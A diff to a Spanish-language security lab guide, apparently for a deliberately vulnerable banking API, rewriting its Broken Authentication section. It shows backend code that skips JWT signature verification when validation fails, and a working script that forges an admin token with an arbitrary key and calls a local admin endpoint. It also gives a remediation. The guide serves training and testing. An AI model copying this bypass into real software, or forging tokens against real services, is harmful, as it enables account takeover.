@@ -73,54 +73,47 @@ curl -s http://localhost:8080/api/accounts/ \
 
 ## 2. 🔓 Broken Authentication — API2:2023
 
-**Qué es:** El JWT usa un secreto predecible (`secret`), no tiene expiración, y acepta tokens sin firma (`alg: none`).
+**Qué es:** La API implementa validación de JWT, pero tiene un fallo lógico: si la firma es inválida, el servidor captura el error e intenta decodificar el token *sin verificar la firma* usando `options={"verify_signature": False}`.
 
-**Impacto bancario:** Un atacante puede forjar tokens para cualquier usuario sin conocer la contraseña.
+**Impacto bancario:** Un atacante puede forjar tokens para cualquier usuario (incluyendo administradores) firmándolos con cualquier clave basura, ya que el servidor ignorará la firma.
 
 ### 🔍 Código vulnerable del backend
 
 ```python
-# app/auth.py — Configuración JWT
-JWT_SECRET = "secret"  # ❌ Secreto débil, fácil de bruteforcear
-JWT_ALGORITHM = "HS256"
-
-def create_token(user_id, username, role):
-    payload = {
-        "user_id": user_id,
-        "username": username,
-        "role": role,
-        # ❌ No hay claim "exp" — el token NUNCA expira
-    }
-    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)
-
+# app/auth.py
 def decode_token(token):
     try:
-        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM, "none"])
+        # Intenta decodificar normalmente
+        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
         return payload
     except jwt.InvalidSignatureError:
-        # ❌ Si la firma falla, intenta sin verificar
-        payload = jwt.decode(token, options={"verify_signature": False}, algorithms=["HS256", "none"])
-        return payload
+        # ❌ VULN: Si la firma es inválida, lo acepta de todos modos (Signature Bypass)
+        try:
+            payload = jwt.decode(token, options={"verify_signature": False}, algorithms=["HS256", "none"])
+            return payload
 ```
 
-### Explotación — Forjar token de admin
+### Explotación — JWT Signature Bypass
+
+No necesitamos conocer la palabra secreta del servidor. Podemos firmar el token con una clave falsa (ej: `basura123`), la firma será inválida, pero el backend lo aceptará igual.
 
 ```bash
-# El secreto es "secret" — forjar token de admin directamente
+# 1. Forjar un token de admin usando una clave secreta cualquiera
 FORGED=$(python3 -c "
 import jwt
-token = jwt.encode({'user_id':1, 'username':'admin', 'role':'admin'}, 'secret', algorithm='HS256')
+# Firmamos con 'clave_falsa' — al backend no le importará
+token = jwt.encode({'user_id':1, 'username':'admin', 'role':'admin'}, 'clave_falsa', algorithm='HS256')
 print(token)
 ")
 
 echo "Token forjado: $FORGED"
 
-# Usar el token forjado para acceder como admin
+# 2. Usar el token forjado para acceder al endpoint de admin
 curl -s http://localhost:8080/api/admin/stats \
   -H "Authorization: Bearer $FORGED" | python3 -m json.tool
 ```
 
-**Remediación:** Usar secretos fuertes (256+ bits), agregar `exp` (expiración), rechazar `alg: none`, usar `RS256` con par de claves.
+**Remediación:** Nunca usar `verify_signature: False` en producción. Si `InvalidSignatureError` ocurre, la solicitud debe ser rechazada inmediatamente con un 401 Unauthorized.
 
 ---
 
